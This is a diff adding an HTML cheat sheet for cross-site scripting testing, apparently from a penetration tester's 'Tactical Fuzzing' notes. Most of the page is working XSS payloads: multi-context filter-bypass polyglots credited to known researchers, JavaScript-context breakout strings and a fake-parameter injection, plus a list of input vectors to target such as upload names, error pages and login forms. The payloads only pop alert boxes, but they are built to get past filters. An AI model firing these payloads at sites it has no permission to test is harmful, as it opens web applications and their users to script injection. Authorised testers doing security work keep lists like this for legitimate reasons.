@@ -1,0 +1,41 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>XSS</title>
+</head><body>Tactical Fuzzing - XSS XSS <br/>
+Core Idea: Does the page functionality display something to the users? <br/>
+For time sensitive testing the 80/20 rule applies. <br/>
+Many testers use Polyglot payloads. You probably have too!<br/>
+<br/>
+*Multi-context, filter bypass based polyglot payload #1 (Rsnake XSS Cheat Sheet) ';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- &gt;&lt;/SCRIPT&gt;"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83)) &lt;/SCRIPT&gt;<br/>
+<br/>
+Multi-context, filter bypass based polyglot payload #2 (Ashar Javed XSS Research) &nbsp;<br/>
+"&gt;&gt;&lt;marquee&gt;&lt;img src=x onerror=confirm(1)&gt;&lt;/marquee&gt;" &gt;&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouseover=prompt(1) &gt;&lt;script&gt;prompt(1)&lt;/script&gt;@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;'--&gt;" &gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;"&gt;&lt;img/id="confirm&amp;lpar; 1)"/alt="/"src="/"onerror=eval(id&amp;%23x29;&gt;'"&gt;&lt;img src="http: //i.imgur.com/P8mL8.jpg"&gt;<br/>
+<br/>
+### Multi-context polyglot payload (Mathias Karlsson) &nbsp;<br/>
+" onclick=alert(1)//&lt;button ‘ onclick=alert(1)//&gt; */ alert(1)//<br/>
+<br/>
+###&nbsp;Other XSS Observations <br/>
+Input Vectors: <br/>
+- Customizable Themes &amp; Profiles via CSS <br/>
+- Event or meeting names <br/>
+- URI based <br/>
+- Imported from a 3rd party (think Facebook integration) <br/>
+- JSON POST Values (check returning content type) <br/>
+- File Upload names <br/>
+- Uploaded files (swf, HTML, ++) <br/>
+- Custom Error pages <br/>
+- fake params - ?realparam=1&amp;foo=bar’+alert(/XSS/)+’ <br/>
+- Login and Forgot password forms <br/>
+<br/>
+## SWF Parameter XSS Common Params: <br/>
+onload, allowedDomain, movieplayer, xmlPath, eventhandler, callback (more on OWASP page) <br/>
+<br/>
+Common Injection Strings:&nbsp; <br/>
+%22})))}catch(e){alert(document.domain);}//<br/>
+&nbsp; &nbsp;<br/>
+"]);}catch(e){}if(!self.a)self.a=!alert(document.domain);//<br/>
+&nbsp; &nbsp;<br/>
+"a")(({type:"ready"}));}catch(e){alert(1)}//<br/>
+</body></html>
